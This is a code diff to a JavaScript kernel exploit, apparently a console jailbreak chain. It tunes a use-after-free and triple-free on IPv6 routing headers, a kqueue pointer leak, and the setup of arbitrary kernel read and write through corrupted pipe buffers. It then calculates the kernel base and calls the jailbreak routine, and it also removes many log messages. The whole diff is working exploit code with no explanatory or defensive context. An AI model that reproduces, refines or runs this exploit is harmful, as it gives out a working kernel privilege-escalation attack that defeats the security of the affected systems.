@@ -117,10 +117,11 @@ var MSG_IOV_NUM = 0x17; // 23
 var IPV6_SOCK_NUM = 96;
 var IOV_THREAD_NUM = 8;
 var UIO_THREAD_NUM = 8;
-var MAIN_LOOP_ITERATIONS = 4;
-var TRIPLEFREE_ITERATIONS = 5;
+var MAIN_LOOP_ITERATIONS = 3;
+var TRIPLEFREE_ITERATIONS = 6;
+ var MAX_KQ = 4000;
 var MAX_ROUNDS_TWIN = 5;
-var MAX_ROUNDS_TRIPLET = 120;
+var MAX_ROUNDS_TRIPLET = 150;
 var MAIN_CORE = 4;
 var MAIN_RTPRIO = 0x100;
 var RTP_LOOKUP = 0;
@@ -926,7 +927,7 @@ function yield_to_render(callback) {
 var exploit_count = 0;
 var exploit_end = false;
 function netctrl_exploit() {
-  nanosleep_fun(1);
+  nanosleep_fun(2);
   setup_log_screen();
   var supported_fw = init();
   if (!supported_fw) {
@@ -953,14 +954,17 @@ function phase_trigger() {
     yield_to_render(phase_trigger);
     return;
   }
+  
   yield_to_render(phase_leak);
 }
 function phase_leak() {
-  log('Leaking .....');
+  
   if (!leak_safe()) {
     yield_to_render(phase_trigger);
     return;
   }
+
+  log('Leaking .....');
   yield_to_render(phase_rw);
 }
 function phase_rw() {
@@ -971,36 +975,29 @@ function phase_jailbreak() {
   jailbreak();
 }
 function setup_arbitrary_rw() {
-  log('Setting up arbitrary R/W...');
   if (kq_fdp.eq(0)) {
-    log('Invalid kq_fdp');
-    throw new Error('rw_fail');
+    throw new Error('kq_fdp_fail');
   }
   var fd_files = kreadslow64_safe(kq_fdp);
   if (fd_files.eq(BigInt_Error)) {
-    log('fd_files leak failed');
-    throw new Error('rw_fail');
+    throw new Error('fd_files leak_fail');
   }
   fdt_ofiles = fd_files;
   if (master_pipe[0] < 0 || victim_pipe[0] < 0) {
-    log('Invalid pipe fds');
-    throw new Error('rw_fail');
+    throw new Error('pipe0_fail');
   }
   master_r_pipe_file = kreadslow64_safe(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE));
   victim_r_pipe_file = kreadslow64_safe(fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE));
   if (master_r_pipe_file.eq(BigInt_Error) || victim_r_pipe_file.eq(BigInt_Error)) {
-    log('Pipe file leak failed');
-    throw new Error('rw_fail');
+    throw new Error('Pipe leak1_fail');
   }
   master_r_pipe_data = kreadslow64_safe(master_r_pipe_file.add(0x00));
   victim_r_pipe_data = kreadslow64_safe(victim_r_pipe_file.add(0x00));
   if (master_r_pipe_data.eq(BigInt_Error) || victim_r_pipe_data.eq(BigInt_Error)) {
-    log('Pipe data leak failed');
-    throw new Error('rw_fail');
+    throw new Error('Pipe leak2_fail');
   }
   if (master_r_pipe_data.eq(0) || victim_r_pipe_data.eq(0)) {
-    log('Invalid pipe data');
-    throw new Error('rw_fail');
+    throw new Error('pipe data_fail');
   }
   write32(master_pipe_buf.add(0x00), 0);
   write32(master_pipe_buf.add(0x04), 0);
@@ -1009,8 +1006,7 @@ function setup_arbitrary_rw() {
   write64(master_pipe_buf.add(0x10), victim_r_pipe_data);
   var ret_write = kwriteslow(master_r_pipe_data, master_pipe_buf, PIPEBUF_SIZE);
   if (ret_write.eq(BigInt_Error)) {
-    log('Pipebuf write failed');
-    throw new Error('rw_fail');
+    throw new Error('Pipebuf write_fail');
   }
   safe_fhold_fd(master_pipe[0], 'master_pipe[0]');
   safe_fhold_fd(master_pipe[1], 'master_pipe[1]');
@@ -1026,14 +1022,12 @@ function setup_arbitrary_rw() {
     remove_rthr_from_socket(ipv6_socks[triplets[2]]);
   } catch (e) {}
   remove_uaf_file();
-  log('Arbitrary R/W ready');
 }
 function find_allproc() {
   // Use existing master_pipe instead of creating new one
   var pipe_0 = master_pipe[0];
   var pipe_1 = master_pipe[1];
   if (pipe_0 < 0 || pipe_1 < 0) {
-    log('find_allproc: invalid master_pipe fds');
     return new BigInt(0);
   }
   debug('find_allproc - Using master_pipe fds: ' + pipe_0 + ', ' + pipe_1);
@@ -1079,11 +1073,9 @@ function jailbreak() {
 
   // حراسة على الـ offsets والـ FW
   if (!kernel_offset) {
-    log('jailbreak: kernel_offset not loaded');
     throw new Error('Kernel offsets not loaded');
   }
   if (FW_VERSION === null) {
-    log('jailbreak: FW_VERSION is null');
     throw new Error('FW_VERSION is null');
   }
 
@@ -1097,15 +1089,12 @@ function jailbreak() {
 
   // Calculate kernel base
   if (!kl_lock || kl_lock.eq(0)) {
-    log('jailbreak: kl_lock is invalid');
     throw new Error('kl_lock is invalid');
   }
   kernel.addr.base = kl_lock.sub(kernel_offset.KL_LOCK);
-  log('Kernel base: ' + hex(kernel.addr.base));
 
   // المنطق المشترك حسب الـ FW
   jailbreak_shared(FW_VERSION);
-  log('Jailbreak Complete - JAILBROKEN');
 
   // Cleanup من غير قتل الـ workers بقوة
   cleanup(false);
@@ -1449,7 +1438,7 @@ function leak_kqueue() {
 
   // 2) اعمل free مرة واحدة فقط قبل اللوب
   free_rthdr(ipv6_socks[triplets[1]]);
-  var MAX_KQ = 4000;
+
   var magic_val = new BigInt(0x0, 0x1430000);
   var magic_add = leak_rthdr.add(0x08);
   for (var i = 0; i < MAX_KQ; i++) {
